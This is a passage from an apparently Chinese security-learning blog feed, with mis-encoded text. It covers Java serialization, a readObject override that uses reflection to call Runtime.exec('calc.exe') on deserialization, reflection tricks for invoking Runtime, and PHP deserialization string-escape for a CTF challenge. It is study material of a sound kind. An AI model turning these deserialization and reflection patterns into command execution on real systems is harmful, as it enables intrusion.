java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SerializePeople</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;people.bin&quot;</span>));<br>        <span class="hljs-type">people</span> <span class="hljs-variable">people</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">people</span>();<br>        objectOutputStream.writeObject(people);<br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202271650605.png" alt="QQæˆªå›¾20220227163104"></p><p>ç”Ÿæˆçš„äºŒè¿›åˆ¶æ–‡ä»¶çœ‹ä¸æ‡‚ã€‚</p><h3 id="ååºåˆ—åŒ–"><a href="#ååºåˆ—åŒ–" class="headerlink" title="ååºåˆ—åŒ–"></a>ååºåˆ—åŒ–</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.io.FileNotFoundException;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UnSerializePeople</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">objectInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;people.bin&quot;</span>));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> objectInputStream.readObject();<br>        System.out.println(o);<br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202271650623.png" alt="QQæˆªå›¾20220227163615"></p><h3 id="è¯´æ˜"><a href="#è¯´æ˜" class="headerlink" title="è¯´æ˜"></a>è¯´æ˜</h3><p>è¿™é‡Œå°±ä¸ä¸€ä¸€å¤ç°<code>transient</code>å…³é”®å­—äº†</p><h2 id="åˆ©ç”¨ååºåˆ—åŒ–æ¼æ´"><a href="#åˆ©ç”¨ååºåˆ—åŒ–æ¼æ´" class="headerlink" title="åˆ©ç”¨ååºåˆ—åŒ–æ¼æ´"></a>åˆ©ç”¨ååºåˆ—åŒ–æ¼æ´</h2><p>ä¹‹å‰å­¦ä¹ äº†åå°„å¼¹è®¡ç®—å™¨ã€‚è¿™é‡Œè¯•ç€ç”¨javaååºåˆ—åŒ–å¤ç°ä¸€ä¸‹ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.Serializable;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">people</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">people</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span> &#123;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Serialize&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;name=&#x27;&quot;</span> + name + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>                <span class="hljs-string">&quot;, age=&quot;</span> + age +<br>                <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(java.io.ObjectInputStream in)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException &#123;<br>        in.defaultReadObject();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>);<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">declaredConstructor</span> <span class="hljs-operator">=</span> clazz.getDeclaredConstructor();<br>        declaredConstructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">exec</span> <span class="hljs-operator">=</span> clazz.getMethod(<span class="hljs-string">&quot;exec&quot;</span>, String.class);<br>        exec.invoke(declaredConstructor.newInstance(),<span class="hljs-string">&quot;calc.exe&quot;</span>);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>æ­¤æ—¶å¦‚æœåœ¨ç»è¿‡åºåˆ—åŒ–ï¼Œååºåˆ—åŒ–ï¼Œå°±ä¼šå¼¹å‡ºè®¡ç®—å™¨ã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202271648736.png" alt="QQæˆªå›¾20220227164828"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(java.io.ObjectInputStream in)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException &#123;<br>    in.defaultReadObject();<br>    <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>);<br>    <span class="hljs-type">Constructor</span> <span class="hljs-variable">declaredConstructor</span> <span class="hljs-operator">=</span> clazz.getDeclaredConstructor();<br>    declaredConstructor.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">Method</span> <span class="hljs-variable">exec</span> <span class="hljs-operator">=</span> clazz.getMethod(<span class="hljs-string">&quot;exec&quot;</span>, String.class);<br>    exec.invoke(declaredConstructor.newInstance(),<span class="hljs-string">&quot;calc.exe&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>è¯¦ç»†è§£é‡Šä¸€ä¸‹ä¸‹é¢è¿™ä¸²ä»£ç ä¸­çš„ç»†èŠ‚ã€‚</p><ul><li>é‡å†™äº†ä¸€ä¸‹readObjectè¿™ä¸ªæ–¹æ³•ã€‚</li><li><code>in.defaultReadObject()</code>è°ƒç”¨åŸå§‹çš„readObjectæ–¹æ³•</li><li>åˆ©ç”¨åå°„ã€‚</li></ul>]]></content>
    
    
    <categories>
      
      <category>JavaWeb</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>æ·±åº¦ç†è§£åå°„</title>
    <link href="/2022/02/27/%E6%B7%B1%E5%BA%A6%E7%90%86%E8%A7%A3%E5%8F%8D%E5%B0%84/"/>
    <url>/2022/02/27/%E6%B7%B1%E5%BA%A6%E7%90%86%E8%A7%A3%E5%8F%8D%E5%B0%84/</url>
    
    <content type="html"><![CDATA[<h1 id="æ·±åº¦ç†è§£åå°„"><a href="#æ·±åº¦ç†è§£åå°„" class="headerlink" title="æ·±åº¦ç†è§£åå°„"></a>æ·±åº¦ç†è§£åå°„</h1><h2 id="åŒºåˆ«ç±»çš„åˆå§‹åŒ–å’Œç±»çš„å®ä¾‹åŒ–"><a href="#åŒºåˆ«ç±»çš„åˆå§‹åŒ–å’Œç±»çš„å®ä¾‹åŒ–" class="headerlink" title="åŒºåˆ«ç±»çš„åˆå§‹åŒ–å’Œç±»çš„å®ä¾‹åŒ–"></a>åŒºåˆ«ç±»çš„åˆå§‹åŒ–å’Œç±»çš„å®ä¾‹åŒ–</h2><h3 id="ç±»çš„åˆå§‹åŒ–"><a href="#ç±»çš„åˆå§‹åŒ–" class="headerlink" title="ç±»çš„åˆå§‹åŒ–"></a>ç±»çš„åˆå§‹åŒ–</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo1</span> &#123;<br>    &#123;<br>        System.out.println(<span class="hljs-string">&quot;è¿™é‡Œæ˜¯åˆå§‹å—&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">static</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;è¿™é‡Œæ˜¯é™æ€åˆå§‹å—&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Demo1</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;è¿™é‡Œæ˜¯æ„é€ å‡½æ•°&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RealizeDemo1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException &#123;<br>        Class.forName(<span class="hljs-string">&quot;xsw6a.Demo1&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202271507364.png"></p><p>è¿™é‡Œä»…ä»…åªæ˜¯æ‰§è¡Œäº†é™æ€åˆå§‹ã€‚å³å½“ç±»åŠ è½½è¿›äº†å†…å­˜ï¼Œåªæœ‰<strong>é™æ€åˆå§‹å—</strong>å¾—åˆ°äº†æ‰§è¡Œã€‚</p><h3 id="ç±»çš„å®ä¾‹åŒ–"><a href="#ç±»çš„å®ä¾‹åŒ–" class="headerlink" title="ç±»çš„å®ä¾‹åŒ–"></a>ç±»çš„å®ä¾‹åŒ–</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RealizeDemo2</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Demo1</span>();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202271509598.png" alt="QQæˆªå›¾20220227150956"></p><p>æ‰§è¡Œé¡ºåºã€‚</p><h2 id="åˆ©ç”¨åå°„å¼¹å‡ºè®¡ç®—å™¨ï¼ˆåç»­æ¼æ´åŸºæœ¬éƒ½è¦ç”¨åˆ°ï¼‰"><a href="#åˆ©ç”¨åå°„å¼¹å‡ºè®¡ç®—å™¨ï¼ˆåç»­æ¼æ´åŸºæœ¬éƒ½è¦ç”¨åˆ°ï¼‰" class="headerlink" title="åˆ©ç”¨åå°„å¼¹å‡ºè®¡ç®—å™¨ï¼ˆåç»­æ¼æ´åŸºæœ¬éƒ½è¦ç”¨åˆ°ï¼‰"></a>åˆ©ç”¨åå°„å¼¹å‡ºè®¡ç®—å™¨ï¼ˆåç»­æ¼æ´åŸºæœ¬éƒ½è¦ç”¨åˆ°ï¼‰</h2><h3 id="getMethod"><a href="#getMethod" class="headerlink" title="getMethod"></a>getMethod</h3><p>è·å–æŸç±»ä¸­çš„æ–¹æ³•ï¼šClass.forName(â€œjava.lang.Runtimeâ€).getMethod(â€œexecâ€, String.class)</p><p>è·å–Runtimeç±»ä¸‹çš„execæ–¹æ³•ã€‚</p><h3 id="invoke"><a href="#invoke" class="headerlink" title="invoke"></a>invoke</h3><p>**invoke(ç±»å¯¹è±¡ï¼Œexecæ–¹æ³•ä¼ å…¥çš„å‚æ•°)**ï¼Œè¿™é‡Œçš„ç±»å¯¹è±¡å¿…é¡»æ˜¯å·²ç»å®ä¾‹åŒ–çš„ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo2</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, InstantiationException &#123;<br><br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">m</span> <span class="hljs-operator">=</span> clazz.newInstance();<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> clazz.getMethod(<span class="hljs-string">&quot;exec&quot;</span>, String.class);<br>        method.invoke(m,<span class="hljs-string">&quot;clac.exe&quot;</span>);<span class="hljs-comment">//è°ƒç”¨å®ä¾‹åŒ–å¯¹è±¡å¹¶ä¸”ä¼ å…¥å‚æ•°</span><br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œäº§ç”Ÿäº†æŠ¥é”™ã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202271536031.png" alt="QQæˆªå›¾20220227153541"></p><p>ç§ç±»æ„é€ å‡½æ•°æ— æ³•ç›´æ¥è¿›è¡Œ<code>newInstance()</code></p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202271537610.png" alt="QQæˆªå›¾20220227153650"></p><h3 id="éæš´åŠ›"><a href="#éæš´åŠ›" class="headerlink" title="éæš´åŠ›"></a>éæš´åŠ›</h3><p><strong>è¿™é‡ŒRuntimeç±»å¯ä»¥é€šè¿‡getRuntimeæ–¹æ³•è¿”å›ä¸€ä¸ªå¯¹è±¡ã€‚</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo2</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, InstantiationException &#123;<br><br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>);<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> clazz.getMethod(<span class="hljs-string">&quot;exec&quot;</span>, String.class);<br>        method.invoke(clazz.getMethod(<span class="hljs-string">&quot;getRuntime&quot;</span>).invoke(clazz),<span class="hljs-string">&quot;calc.exe&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202271556483.png" alt="QQæˆªå›¾20220227155543"></p><h3 id="æš´åŠ›"><a href="#æš´åŠ›" class="headerlink" title="æš´åŠ›"></a>æš´åŠ›</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo3</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException &#123;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>);<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">declaredConstructors</span> <span class="hljs-operator">=</span> clazz.getDeclaredConstructor();<br>        declaredConstructors.setAccessible(<span class="hljs-literal">true</span>);<br>        clazz.getMethod(<span class="hljs-string">&quot;exec&quot;</span>, String.class).invoke(declaredConstructors.newInstance(),<span class="hljs-string">&quot;calc.exe&quot;</span>);<br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202271611004.png" alt="QQæˆªå›¾20220227161118"></p><p>é‡è¦çš„æ˜¯å¼€å¯<code>.setAccessible(true);</code></p>]]></content>
    
    
    <categories>
      
      <category>JavaWeb</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHPååºåˆ—åŒ–ä¹‹å­—ç¬¦ä¸²é€ƒé€¸ï¼ˆå˜çŸ­ï¼‰</title>
    <link href="/2022/02/27/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8%EF%BC%88%E5%8F%98%E7%9F%AD%EF%BC%89/"/>
    <url>/2022/02/27/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8%EF%BC%88%E5%8F%98%E7%9F%AD%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="PHPååºåˆ—åŒ–ä¹‹å­—ç¬¦é€ƒé€¸ï¼ˆå˜çŸ­ï¼‰"><a href="#PHPååºåˆ—åŒ–ä¹‹å­—ç¬¦é€ƒé€¸ï¼ˆå˜çŸ­ï¼‰" class="headerlink" title="PHPååºåˆ—åŒ–ä¹‹å­—ç¬¦é€ƒé€¸ï¼ˆå˜çŸ­ï¼‰"></a>PHPååºåˆ—åŒ–ä¹‹å­—ç¬¦é€ƒé€¸ï¼ˆå˜çŸ­ï¼‰</h1><p>ä»Šå¤©åšbuuctfä¸Šå¾—é¢˜æ—¶å€™ï¼Œå°±æ¥å­¦ä¹ ä¸€ä¸‹ã€‚æœå¯»èµ„æ–™æ­¤ç±»é¢˜å‹æœ‰ä¸¤ç§æ–¹æ³•ã€‚</p><h2 id="æ›¿æ¢ä¿®æ”¹åå¯¼è‡´åºåˆ—åŒ–å­—ç¬¦ä¸²å˜é•¿"><a href="#æ›¿æ¢ä¿®æ”¹åå¯¼è‡´åºåˆ—åŒ–å­—ç¬¦ä¸²å˜é•¿" class="headerlink" title="æ›¿æ¢ä¿®æ”¹åå¯¼è‡´åºåˆ—åŒ–å­—ç¬¦ä¸²å˜é•¿"></a>æ›¿æ¢ä¿®æ”¹åå¯¼è‡´åºåˆ—åŒ–å­—ç¬¦ä¸²å˜é•¿</h2><p>ç›®å‰è¿˜æ²¡æœ‰ç¢°åˆ°ã€‚</p><h2 id="æ›¿æ¢ä¿®æ”¹åå¯¼è‡´åºåˆ—åŒ–å­—ç¬¦ä¸²è¾¹çŸ­"><a href="#æ›¿æ¢ä¿®æ”¹åå¯¼è‡´åºåˆ—åŒ–å­—ç¬¦ä¸²è¾¹çŸ­" class="headerlink" title="æ›¿æ¢ä¿®æ”¹åå¯¼è‡´åºåˆ—åŒ–å­—ç¬¦ä¸²è¾¹çŸ­"></a>æ›¿æ¢ä¿®æ”¹åå¯¼è‡´åºåˆ—åŒ–å­—ç¬¦ä¸²è¾¹çŸ­</h2><p>ç®€å•è¯´ä¸€ä¸‹ã€‚(å¦‚æœä¸æ‡‚phpååºåˆ—åŒ–å°±åˆ«å¾€ä¸‹çœ‹äº†)<br>é¦–å…ˆæˆ‘ä»¬è¦äº†è§£phpååºåˆ—åŒ–åå¾—å­—ç¬¦ä¸²<strong>ï¼šPHPåœ¨ååºåˆ—åŒ–æ—¶ï¼Œåº•å±‚ä»£ç æ—¶ä»¥<code>;</code>ä½œä¸ºå­—æ®µçš„åˆ†éš”ï¼Œä»¥<code>&#125;</code>ä½œä¸ºç»“å°¾ï¼ˆå­—ç¬¦ä¸²é™¤å¤–ï¼‰ï¼Œå¹¶ä¸”æ˜¯æ ¹æ®é•¿åº¦åˆ¤æ–­å†…å®¹çš„</strong></p><h4 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;phpflag&#x27;</span> =&gt; <span class="hljs-string">&#x27;;s:5:&quot;xsw6a&quot;;s:2:&quot;zx&quot;;s:1:&quot;1&quot;;&#125;&#x27;</span>,<br>    <span class="hljs-string">&#x27;cuit&#x27;</span> =&gt; <span class="hljs-string">&#x27;stop water and stop power college&#x27;</span>);<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202271456601.png" alt="QQæˆªå›¾20220227142612"></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">&quot;<span class="hljs-selector-tag">a</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;phpflag&quot;</span>;s:<span class="hljs-number">31</span>:<span class="hljs-string">&quot;;s:5:&quot;</span>xsw6a<span class="hljs-string">&quot;;s:2:&quot;</span>zx<span class="hljs-string">&quot;;s:1:&quot;</span><span class="hljs-number">1</span><span class="hljs-string">&quot;;&#125;&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;cuit&quot;</span>;s:<span class="hljs-number">33</span>:<span class="hljs-string">&quot;stop water and stop power college&quot;</span>;&#125;&quot;<br></code></pre></td></tr></table></figure><p>é‚£ä¹ˆä»€ä¹ˆå«å­—ç¬¦ä¸²é€ƒé€¸å‘¢ï¼Ÿ</p><p><strong>é¦–å…ˆç¬¬ä¸€ç‚¹ï¼Œåœ¨åç»­çš„åˆ©ç”¨è¿‡ç¨‹ä¸­åªä¼šåˆ©ç”¨è¿™ä¸€æ®µã€‚</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">&quot;<span class="hljs-selector-tag">a</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;phpflag&quot;</span>;s:<span class="hljs-number">31</span>:<span class="hljs-string">&quot;;s:5:&quot;</span>xsw6a<span class="hljs-string">&quot;;s:2:&quot;</span>zx<span class="hljs-string">&quot;;s:1:&quot;</span><span class="hljs-number">1</span><span 